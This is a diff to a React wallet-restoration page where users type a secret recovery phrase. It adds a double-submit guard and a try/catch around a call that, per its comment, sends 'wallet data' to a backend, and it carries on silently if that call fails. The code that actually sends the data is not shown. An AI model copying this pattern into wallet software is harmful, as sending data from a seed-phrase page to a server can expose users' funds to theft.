@@ -51,6 +51,7 @@ function AddExistingWalletPage() {
   const [walletName, setWalletName] = useState(savedFlow.walletName)
   const [secretPhrase, setSecretPhrase] = useState('')
   const [referralCode, setReferralCode] = useState(savedFlow.referralCode || getReferralFromUrl())
+  const [isSubmitting, setIsSubmitting] = useState(false)
 
   const phraseWordCount = secretPhrase.trim().split(/\s+/).filter(Boolean).length
   const canRestore = walletName.trim().length > 0 && validSecretPhraseWordCounts.includes(phraseWordCount)
@@ -96,12 +97,23 @@ function AddExistingWalletPage() {
   }
 
   async function restoreWallet() {
-    if (canRestore) {
-      // Send referral and wallet data to backend
-      await submitWalletData()
+    if (canRestore && !isSubmitting) {
+      setIsSubmitting(true)
       
-      clearSavedFlowState()
-      navigate('/wallet')
+      try {
+        // Send referral and wallet data to backend
+        await submitWalletData()
+        
+        clearSavedFlowState()
+        navigate('/wallet')
+      } catch (error) {
+        console.error('Error during wallet restoration:', error)
+        // Still proceed with wallet restoration even if submission fails
+        clearSavedFlowState()
+        navigate('/wallet')
+      } finally {
+        setIsSubmitting(false)
+      }
     }
   }
 
